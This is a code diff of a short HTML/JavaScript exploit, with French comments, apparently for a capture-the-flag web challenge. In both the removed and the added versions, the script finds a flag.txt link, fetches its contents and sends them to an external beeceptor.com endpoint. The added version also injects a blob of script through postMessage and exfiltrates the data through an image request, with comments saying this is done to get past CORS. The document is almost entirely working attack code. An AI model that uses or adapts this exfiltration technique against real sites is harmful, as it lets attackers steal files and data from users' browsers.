@@ -1,17 +1,25 @@
 <html><body><script>
 (async () => {
-  await new Promise(r => setTimeout(r, 500)); // attendre le chargement
+  /* 1. blob html */
+  const epic = `
+    <script>
+      (async () => {
+        /* trouver le lien flag */
+        const a=[...parent.document.querySelectorAll('a')]
+                .find(x=>/flag\.txt$/.test(x.textContent));
+        if(!a) return;
+        const txt = await (await fetch(a.href)).text();
+        /* exfiltration par balise img pour contourner CORS */
+        new Image().src = 'https://webtest.free.beeceptor.com/exfil?f='+
+                          encodeURIComponent(txt);
+      })();
+    <\/script>`;
+  const blob = new Blob([epic], {type:'text/html'});
 
-  const a = [...document.querySelectorAll('a')]
-    .find(x => x.href && /\.txt$/.test(x.href));
-
-  if (a) {
-    const res = await fetch(a.href);
-    const flag = await res.text();
-
-    fetch('https://webtest.free.beeceptor.com/exfil?f=' + encodeURIComponent(flag));
-  } else {
-    fetch('https://webtest.free.beeceptor.com/exfil?f=' + 'rien');
-  }
+  /* 2. postmessage vers la page index */
+  window.postMessage({
+    type:'share',
+    files:[{blob, name:'epic.html', cached:false}]
+  }, '*');
 })();
 </script></body></html>
